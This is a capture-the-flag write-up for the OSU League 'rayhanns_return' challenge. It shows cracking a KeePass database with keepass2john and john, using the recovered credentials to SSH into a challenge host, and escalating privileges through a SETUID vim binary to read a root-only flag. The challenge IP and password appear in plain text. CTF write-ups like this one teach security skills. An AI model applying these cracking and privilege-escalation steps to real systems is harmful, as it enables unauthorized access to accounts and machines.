---
title: "OSU League 2020/2021 - rayhanns_return Writeup"
date: 2021-02-22
draft: false
description: ""
tags: ["ctf"]
---
For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the `rockyou.txt` wordlist.

The first thing I did was mount the ISO file to my file system to see its contents:

```
$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk
$ cd /mnt/disk
$ ls
lost+found  rhodgson.kdbx
```

Interesting, we have a keepass password database. Let's see if we can open it:

```
$ kpcli --kdb rhodgson.kdbx 
Please provide the master password: *************************
Couldn't load the file rhodgson.kdbx: Missing pass
```

Dang, looks like we need to know the master password.... Or do we? (Insert Vsauce music)

We were given a password list right at the start, maybe we can use that to try and crack the password. Using johntheripper's `keepass2john`, we can convert this kee pass db into a hash format that john can try to crack:

```
$ ./keepass2john /mnt/disk/rhodgson.kdbx > hash.txt
$ john --wordlist=CTG_STANDARD_WORDLIST.txt  hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1hodgson         (rhodgson)
1g 0:00:00:20 DONE (2021-02-20 18:12) 0.04803g/s 135.2p/s 135.2c/s 135.2C/s prield28..pinkphone98
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And there we go! We have the password to the kee pass file, `1hodgson`.

We can use that password and begin navigating the database.

```
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
rhodgson/
kpcli:/> cd rhodgson/
kpcli:/rhodgson> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. My Flag Box                                               34.216.68.186
kpcli:/rhodgson> show -f My\ Flag\ Box 

 Path: /rhodgson/
Title: My Flag Box
Uname: ubuntu
 Pass: As.3S;d0cvAS3kmm3VI(N
  URL: 34.216.68.186
Notes: This aws thing is maybe useless cause I was messing with permissions, and now I cannot print the flag, and dont understand what I did when I was messing around with SUID bits. https://imgflip.com/i/4yladl

kpcli:/rhodgson> 
```

We have an aws box with the password!!  Default user on aws ubuntu boxes is `ubuntu`, so let's try to SSH into `34.216.68.186` as that user and with that password:

```
ubuntu@ip-172-31-24-45 / % ls
bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
```

We are in! Let's start looking for the flag:

```
ubuntu@ip-172-31-24-45 ~ % ls -lah
total 180K
drwxr-xr-x 7 ubuntu ubuntu 4.0K Feb 21 02:48 .
drwxr-xr-x 4 root   root   4.0K Feb 18 10:27 ..
-rw------- 1 ubuntu ubuntu   61 Feb 20 03:44 .Xauthority
-rw------- 1 ubuntu ubuntu 1.8K Feb 20 04:10 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3.7K Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4.0K Feb 18 09:53 .cache
drwx------ 3 ubuntu ubuntu 4.0K Feb 20 06:37 .config
-rw------- 1 root   root     28 Feb 19 02:56 .flag

ubuntu@ip-172-31-24-45 ~ % cat .flag
cat: .flag: Permission denied
```

After a little digging, I was able to find `.flag` hidden in the home directory of ubuntu. But the file is only readable by root :/

Usually with boxes like this, the first thing I look for is any SETUID binarys that I could use to priv esc or read certain files, so let's try that:

```
ubuntu@ip-172-31-24-45 ~ % find / -perm -4000 2>/dev/null           
...
/usr/bin/at
/usr/bin/sudo
/usr/bin/vim.basic
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
```

Sweet! We have vim as a SETUID, that means we can just read the flag with root privileges by doing `$ vim .flag`:

And we get the flag!  

`osu{rAyh44n_is_b4d_@_0ps3c}`